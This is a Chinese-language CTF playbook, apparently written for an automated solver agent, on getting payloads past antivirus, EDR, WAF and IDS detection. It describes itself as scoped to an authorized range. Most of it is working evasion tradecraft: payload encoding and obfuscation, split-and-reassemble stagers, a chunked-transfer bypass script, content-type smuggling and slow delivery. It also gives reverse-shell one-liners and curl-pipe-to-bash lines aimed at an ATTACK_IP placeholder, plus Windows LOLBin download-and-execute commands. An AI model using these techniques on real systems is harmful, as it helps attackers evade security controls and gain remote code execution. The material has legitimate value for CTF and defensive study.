# Evasion 域 Playbook —— 载荷过检测手册(杀软/EDR/WAF/流量四类)

**使命:载荷被检测拦截时,先判层、单层改造、A/B 验证,投递成功拿 `flag{...}` 立即写 `flags.json`。**
读者是执行层 solver(flash 级):照表执行。靶场授权环境,检测器是题目的一部分——**改自己的载荷,不碰检测器与平台**。分寸:只做检测原理推演与单层改造,不做真实样本免杀、不堆壳。

## 0. 硬纪律(违反=事故)

- 拦截 = 题面设计的一部分,通常只有一层在拦。**任务是找出那一层,不是把所有变形堆上去。**
- 临时文件全放 `tmp/`:原始载荷 `tmp/orig.*`,改造版 `tmp/v1.*` 递增;每次投递留痕 `curl ... -o tmp/resp -D tmp/h.txt`。迭代靠这些。
- 无出网:回连/下载一律指向攻击机内网 IP(`ip -4 addr show` 取地址,`python3 -m http.server 8000` 起服务);禁公网地址/Collaborator。
- 每层变形 ≤6 发;6 发没过 = 该层无效,换层。
- 拿到 flag 第一优先级写 flags.json(§7),再继续消融或下一题。

---

## 1. 先判定拦在哪层(第一动作,别跳过)

| 层位 | 典型症状 | 确认方法(逐条跑) |
|---|---|---|
| WAF/网关层 | HTTP 响应 403/406;返回拦截页(含 waf/forbidden/blocked/risk/security 字样);响应头有网关指纹 | `curl -sS -o tmp/r.html -D tmp/r.h "$T/"; head -20 tmp/r.h; grep -io 'waf\|forbidden\|blocked\|security' tmp/r.html` — 再发一发无害载荷(`q=hello`):无害过+原载荷拦 = 内容特征;都拦 = 通道/元数据特征 |
| 网络层(IPS/NIDS) | 请求发到一半连接断;curl 报 `Connection reset by peer`/`Recv failure`;TCP 通但拿不到响应 | `curl -sv "$T/" 2>&1 \| tail -5` 看 reset 时序;短无害请求能通 = 长度/内容触发的 inline 阻断;**稳定复现 2 次**才算,偶发断不算 |
| 主机文件层(杀软扫描) | 文件投递成功但消失(ls 到→再看没了);或执行瞬间报 `Virus/Trojan/EICAR` 文案、退出码非 0 带检测名 | 落地后连看:`ls -la /tmp/p*; md5sum /tmp/p*; sleep 3; ls -la /tmp/p*` — 第二次没了 = 实时防护静默删;有报毒文案 = 显式扫描。换无害文件名(`notes.txt`)能存活 = 扫内容;仍消失 = 扫哈希 |
| 行为层(EDR) | 文件能落地、进程能起、几秒内死(先有部分输出);反弹 shell 刚连上即断;特定动作(`nc -e`、写计划任务)执行即被掐 | `./p; echo $?`(128+N = 被 N 号信号杀,137=SIGKILL 是典型);`timeout 10 ./p` 看前台存活;拆步骤:只写文件不执行(过)→ 执行(死)= 行为触发 |

定位漏斗(二分,每步一发,顺序执行):

```
1. 无害载荷(同通道发 q=hello 或 echo hi 的编码)→ 拦?
   拦 = 通道/元数据特征 → §3 传输层
   过 = 内容特征 → 2
2. 原载荷改 1 字节(尾部加换行)重投 → 过?
   过 = 哈希/精确匹配黑名单 → 最小扰动即可,§2.1 任挑一种编码
   仍拦 = 特征扫描 → §2 静态改造
3. 静态改造后落地成功、执行死 → §4 行为规避
```

**过门信号(没看到就是没过,不叠加下一发)**:WAF 层 403→200/400/401 或响应长度变化;文件层存活 >30s 且 md5 前后一致;行为层进程跑完、退出码正常(0 或预期码);网络层连接不 RST、完整响应收到。

---

## 2. 静态特征改造(拦内容 → 改载荷本体)

原理一句话:检测器按签名(关键字/魔数/哈希)匹配;改造 = 破坏匹配 + 在执行端补还原,**两头配平**。每加一层编码,还原多一步、出错面大一分——优先最简。

### 2.1 编码链(生成与还原成对给)

明文载荷存 `tmp/p.txt`(示例内容 `cat /flag*`):

| 编码 | 生成 | 执行端还原 | 适用/注意 |
|---|---|---|---|
| base64 | `printf '%s' "$(cat tmp/p.txt)" \| base64 -w0 > tmp/p.b64` | `base64 -d` / `base64.b64decode` | 首选;长 base64 串可被熵检测标记,被拦换 XOR |
| hex | `xxd -p tmp/p.txt \| tr -d '\n' > tmp/p.hex` | `echo <hex> \| xxd -r -p` | 二进制载荷首选 |
| XOR(key 0x2a) | `python3 -c "d=open('tmp/p.txt','rb').read();open('tmp/p.xor','wb').write(bytes(b^0x2a for b in d))"` | 同一条命令再跑一遍(XOR 自反),key 随件投递或记文件名 | 魔数+关键字同时消失 |
| rot13 | `tr 'A-Za-z' 'N-ZA-Mn-za-m' < tmp/p.txt` | 同一条 tr 反跑 | 纯 ASCII、零依赖、最弱 |
| rot47 | `python3 -c "print(''.join(chr((ord(c)-33+47)%94+33) if 33<=ord(c)<=126 else c for c in open('tmp/p.txt').read()),end='')"` | 同式再跑一遍 | 全可打印字符都变形,数字符号不漏;空格/换行保持原样(域外直通,别去掉范围判断) |

选择:拦明文关键字 → base64 先行;拦 base64 特征(`=` 垫尾/等宽长串)→ hex 或 XOR;拦"解码器调用本身"(载荷里的 `base64 -d` 被扫)→ 还原步骤拆开写(§2.3)。

### 2.2 载荷拆分与重组(stager:分件投递 + 落地合并)

适用:整体哈希/整体签名检测——单件无签名,落地重组。完整流程:

```bash
# 1) 攻击机拆件(512B/件,件名字典序即顺序)
split -b 512 -d tmp/p.bin tmp/part_
# 2) 分件投递(逐件换扩展名/换接口)
curl -sS -F "f=@tmp/part_00;filename=notes.txt" "$T/upload"
curl -sS -F "f=@tmp/part_01;filename=notes.bak" "$T/upload"
# 3) 靶机落地合并(在已拿到的 shell 里)
cat /tmp/notes.* > /tmp/p.bin
md5sum /tmp/p.bin          # 与攻击机 md5sum tmp/p.bin 比对,一致才算完整
chmod +x /tmp/p.bin
```

文本级拆分(脚本载荷免二进制件):`head -n 5 tmp/p.sh > tmp/a.txt; tail -n +6 tmp/p.sh > tmp/b.txt`,靶机 `cat /tmp/a.txt /tmp/b.txt | bash`。

**判定**:重组后 md5 与原件不一致 → 别执行,先修拆分(split 通配顺序、传输层 `\r` 污染)。带病执行会把行为层也惊动,平白多一层噪音。

### 2.3 标识符与字符串混淆(脚本载荷关键字级)

| 语言 | 拦 | 换(逐个试) |
|---|---|---|
| bash | `cat` | `c'a't` `/???/??t /fla*` `$(printf '\x63\x61\x74')` |
| bash | 空格 | `${IFS}` `%09` |
| python | `os.system` | `__import__('o'+'s').system(...)` `'*galf/ tac'[::-1]` `chr(111)+chr(115)` |
| python | `base64` 字面被扫 | `exec(codecs.decode(b'...','rot13'))` / `exec(bytes.fromhex('...'))` |
| JS | `eval(` | `Function('...')()` `\x65val(...)` `[]['flat']['constructor'](...)` |
| PHP | `<?php` | `<?=` 短标签 / `<?php` 前后插空白 / `<?PHP` 大小写 |

铁律:**改完在攻击机本地先跑一遍**,功能等价确认后再投靶机——本地跑不出结果 = 改造错了,别浪费靶机投递名额。

### 2.4 打包器(pyinstaller/UPX)判定与再加工

```bash
file tmp/p.bin                                        # 看 "PyInstaller" / "UPX compressed" 字样
strings tmp/p.bin | grep -im3 'upx\|_MEIPASS\|pyi-'
```

| 判定(先做 §1 实验 2 定性) | 动作 |
|---|---|
| 检测 = 哈希黑名单(改 1 字节即过) | 任何重打包都行:加一行注释/重压缩即可,**别换壳多此一举** |
| 原始被拦,UPX 打包后过 | 继续,记录组合 |
| 原始被拦,打包后**更拦**(`UPX!` 魔串/`_MEIPASS` 固定段被规则拉黑) | 回退不打包,走 §2.1/§2.2 |
| pyinstaller 产物(>10MB、固定段多)被按体积/固定段拦 | 别打包,§2.2 拆件投递更稳 |

再加工:`upx -d` 解壳 → 改字符串 → `upx --best -o out in` 重打。每步一发 A/B;壳变换只放在"内容签名确认绕不动"之后,不是第一反应。

---

## 3. 传输层规避(拦通道 → 改投递方式,载荷本体不动)

### 3.1 分块传输(chunked 切关键字)

原理:网关按流重组扫整段;关键字被切进不同 chunk,浅层重组器拼不回。完整脚本(改 HOST/PORT/PAYLOAD 直接跑):

```python
#!/usr/bin/env python3
# tmp/chunk_deliver.py — payload 切 4B/块,关键字必跨块;带 slow 参数加块间 2s
import socket, sys, time
HOST, PORT, PAYLOAD = "IP", 80, b"q=<PAYLOAD>"
def send(raw):
    s = socket.create_connection((HOST, PORT)); s.sendall(raw)
    r = b""
    while True:
        d = s.recv(4096)
        if not d: break
        r += d
    print(r[:300].decode(errors="replace")); s.close()
body = b""
for c in [PAYLOAD[i:i+4] for i in range(0, len(PAYLOAD), 4)]:
    body += hex(len(c))[2:].encode() + b"\r\n" + c + b"\r\n"
    if len(sys.argv) > 1: time.sleep(2)          # 慢速模式:块间 2s(§3.4)
send(b"POST / HTTP/1.1\r\nHost: h\r\nTransfer-Encoding: chunked\r\n\r\n" + body + b"0\r\n\r\n")
```

curl 也能发 chunked(`curl -H 'Transfer-Encoding: chunked' --data-binary @tmp/p.bin`),但**块边界不可控**,关键字可能整块过检——切关键字必须用手写版。

### 3.2 内容类型伪装

| 手法 | 完整命令/样例 | 原理 |
|---|---|---|
| gzip 藏载 | `printf '%s' "$(cat tmp/p.txt)" \| gzip \| curl -sS --data-binary @- -H 'Content-Encoding: gzip' -H 'Content-Type: application/octet-stream' "$T/submit"` | 网关不解压、应用解压,明文签名消失 |
| multipart 藏 part | `curl -sS -F "note=@tmp/big.txt" -F "payload=@tmp/p.txt;type=application/octet-stream" "$T/upload"` | 检测只扫首个 part 或跳过二进制 MIME |
| JSON 字段藏载+垫长 | `curl -sS -H 'Content-Type: application/json' -d @tmp/body.json "$T/submit"`,body.json:`{"padding":"A×8192","note":"<载荷>"}`(垫 8K/16K/64K 各试) | 载荷进无害字段;填充把真载荷挤出检测窗口 |
| 图片 polyglot | `printf 'GIF89a\n' > tmp/p.gif && cat tmp/p.txt >> tmp/p.gif` 传 `Content-Type: image/gif` | 魔数当图片,文本扫描跳过 |

### 3.3 协议升级判定表(明文被检 → 换通道)

先看靶机开了什么:`nmap -sT -Pn -n --top-ports 300 --max-rate 300 <IP>`,按开放端口选下一通道:

| 现症 | 判定 | 动作(验证命令) |
|---|---|---|
| 明文 HTTP 载荷被拦,短请求通 | 检测在明文流 | 同载荷走 HTTPS:`curl -sk https://IP:443/... --data-binary @tmp/p.txt`(443/8443 开才可用) |
| HTTPS 也拦 | 网关可解密,或拦在应用层 | 转 WebSocket / 带外信道 |
| 靶机有 `/ws` 类端点 | 可升级 WS | 先验证升级:`curl -si -N -H 'Upgrade: websocket' -H 'Connection: Upgrade' -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' -H 'Sec-WebSocket-Version: 13' "http://IP/ws"` 返回 101 = 通道可用;载荷走 WS 帧:`python3 -c "import websocket;ws=websocket.create_connection('ws://IP:PORT/ws');ws.send(open('tmp/p.txt').read());print(ws.recv())"`(帧格式 `0x81+len+payload`,手写也以此为准) |
| 无 WAF 迹象、TCP 全拦 | 走带外 | ICMP:`ping -c1 -p "$(xxd -p tmp/p.bin \| tr -d '\n')" IP`(靶场 IDS 常只盯 TCP) |

回连类载荷(反弹 shell)目标一律攻击机内网 IP,监听提前起好(`nc -lvnp 4444` / 对应 server)。

### 3.4 时间维度(慢速投递)

**启用判定条件(满足其一才慢,否则纯烧预算)**:①§1 实验证实"连发拦、间隔发不拦"(同载荷 10 连发 vs 间隔 3s×10,对比拦截率);②拆块+间隔即过(流重组超时类 IDS)。

```bash
for i in $(seq 1 10); do
  curl -sS --limit-rate 200B --data-binary @tmp/p$i.bin "$T/submit" -o /dev/null
  sleep $((RANDOM % 3 + 2))    # 2~4s 抖动;固定间隔本身可被统计
done
```

---

## 4. 行为规避(靶场级:落地成功、执行被拦)

### 4.1 解释器别名/载体替换(文件在、执行名被拦)

判定:拦的是**执行动作+文件**的绑定(`./p.sh`),不是内容。验证:`cat tmp/p.sh | bash` 能跑 = 绑定被拦、内容没拦,直接换载体:

| 拦 | 换(逐行试) |
|---|---|
| `./p.sh` 报毒 | `bash p.sh` → `cat p.sh \| bash` → `sh -s < p.sh` → `bash -c "$(cat p.sh)"` |
| `python3 p.py` 报毒 | `cat p.py \| python3` → `python3 -c "exec(open('p.py').read())"` → `python3 - < p.py` |
| `php p.php` | `php -r 'include("p.php");'` → `cat p.php \| php` |
| 解释器名在黑名单 | `/usr/bin/env bash p.sh`(绝对路径)`busybox sh p.sh` `/usr/bin/python3.11`(先盘点:`ls /usr/bin \| grep -i 'py\|sh\|perl\|php\|busybox'`) |

### 4.2 内存执行替代落盘(按 §1 判层结果选路)

| 检测点 | 选路 | 命令 |
|---|---|---|
| 文件落地即删(实时防护扫盘) | 全程不落盘 | bash:`bash <<< 'cmds'`;python:`python3 -c "$(cat)" <<< 'code'`;远载:`curl -s http://ATTACK_IP:8000/p.py \| python3`(攻击机先 `python3 -m http.server 8000`,靶机全程零落盘) |
| 落盘没事、执行报毒 | 扫的是文件执行 | §4.1 管道/stdin 喂解释器 |
| 特定动作触发(反弹/敏感命令) | 换实现,不是换落盘 | §4.3 LOLBins |
| 都不拦但 flag 不出 | 不是行为问题 | 回 web/pentest playbook 对应节 |

### 4.3 LOLBins 速查(白名单程序干检测器没料到的事)

Linux(靶机先盘点:`which python3 perl php ruby busybox awk find openssl nc 2>/dev/null`):

| 程序 | 完整命令 | 典型用途 |
|---|---|---|
| curl | `curl -s http://ATTACK_IP:8000/p.sh \| bash` | 无落盘执行 |
| nc(`-e` 被行为拦时) | `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/sh 2>&1 \| nc ATTACK_IP 4444 > /tmp/f` | 反弹的替代实现 |
| openssl | 攻击机先发证书:`openssl req -x509 -newkey rsa:2048 -keyout k.pem -out c.pem -days 1 -nodes -subj /cn=x`,再喂命令:`{ echo 'cat /flag*'; sleep 8; } \| openssl s_server -quiet -key k.pem -cert c.pem -port 443`(管道必须保持喂入,裸 s_server 会因 stdin EOF 秒退);靶机:`openssl s_client -quiet -connect ATTACK_IP:443 \| sh` | 加密通道执行(过明文流量检测),输出回显在靶机侧终端 |
| awk | `awk 'BEGIN{system("cat /flag*")}'` | 免 shell 命令执行 |
| find | `find / -maxdepth 1 -exec cat /flag* \; -quit 2>/dev/null` | `-exec` 载体 |
| perl | `perl -e 'print qx(cat /flag*)'` | 备用解释器 |

Windows(与 pentest 域联动):

| 程序 | 完整命令 | 典型用途 |
|---|---|---|
| certutil | `certutil.exe -urlcache -split -f http://ATTACK_IP:8000/p.exe C:\Temp\p.exe` | 下载 |
| bitsadmin | `bitsadmin /transfer j http://ATTACK_IP:8000/p.exe C:\Temp\p.exe` | 后台下载 |
| mshta | `mshta http://ATTACK_IP:8000/p.hta` | hta 直接执行 |
| msiexec | `msiexec /q /i http://ATTACK_IP:8000/p.msi` | msi 包直接执行 |
| regsvr32 | `regsvr32 /s /n /u /i:http://ATTACK_IP:8000/p.sct scrobj.dll` | sct 脚本执行 |

---

## 5. 验证闭环(A/B,禁止混改)

对照模板:原始载荷存 `tmp/orig.*` 当对照组;每个变体 vN 三件套留痕:载荷 `tmp/vN.*`、响应 `curl -o tmp/vN.resp -D tmp/vN.h`、日志一行:

```bash
echo "| $(date +%T) | v2-xor | 编码XOR/通道HTTP | 结果:200过门 |" >> tmp/evasion-log.md
```

- **一次只改一个变量**(编码 / 通道 / 执行载体,三选一)。
- 改编码没过 → 该层无效,回退原始载荷再改通道。**不要**在已改的编码上叠通道——过了也说不清哪层起效,下题无法复用。
- 过了(信号见 §1 表)→ 记录组合;可选消融:去掉刚改的一层再投一发确认归因(拿 flag 优先,消融可跳过)。
- 三层各扫一轮仍拦 → 回 §1 重新判层(可能判错层),仍无果走 §7 收尾 + 卡壳出口。

## 6. 常见题型速查

| 题面/现象特征 | 层位 | 去哪节 |
|---|---|---|
| 拦截页截图 / 403 / 题面写"WAF" | WAF | §1 判层 → §3.2/§3.1;漏洞类变形另查 waf-bypass 技能 |
| 文件消失 / 报毒截图(检测名、杀软字样) | 主机文件 | §1 实验 → §2.1 编码 → §2.2 拆分 → §4.2 |
| 题面写"流量检测/IDS",连接被断 | 网络 | §3.1 分块 → §3.3 换通道 → §3.4 慢速 |
| 题面写"行为检测/EDR",进程被杀 | 行为 | §4.1 执行载体 → §4.2 内存执行 → §4.3 LOLBins |
| 载荷过长被截断 / 超检测窗口 | 窗口 | §3.2 垫长(8K/16K/64K) |
| 日志给规则名/签名 ID | 按规则反查 | 规则含关键字 → §2.1;含长度 → §3.1;含协议 → §3.3 |
| 给"检测原理"描述 + 要求构造载荷 | 判定型 | 原理就是提示,按它指的层直接套对应节 |
| 过门执行成功后 | 收尾 | cat /flag*(web playbook §6.5)+ §7 提交 |

## 7. 提交纪律

```bash
grep -raoEi 'flag\{[^}]{1,512}\}' tmp/ | sort -u     # 过门执行成功后,响应/文件全量扫
```

- 命中即写工作目录 `flags.json`(JSON Lines,唯一记录通道,引擎自动刮取):
  ```json
  {"flag":"flag{...}","via":"evasion v3: xor编码+chunked 过IDS 后 cat /flag","correct":null}
  ```
- 只追加不重写;引擎自动收集入库,你不需要手工搬运。
- 疑似变形 flag(不完全匹配正则)也写入,标 `"note":"uncertain"`。
- flag 是最高优先级:投递成功拿到输出 → 先写收件箱 → 再做消融。

## 不要

- 一次叠编码+通道+执行三种改造再投——说不清哪层起效,回退成本高(§5)
- 真实样本免杀 / 加壳堆叠 / EDR unhooking——超出靶场单层改造范围,纯烧预算
- 同层 6 发没过继续喷——该层无效,换层
- 不发无害对照就断言"内容特征"——可能是通道拦(§1 漏斗第 1 步必做)
- 没有判定条件就全局慢速投递(§3.4 启用条件)
- 在检测器服务/平台侧找漏洞——只改自己的载荷
- 带病执行:重组 md5 不一致还硬跑——惊动行为层,白造噪音(§2.2)
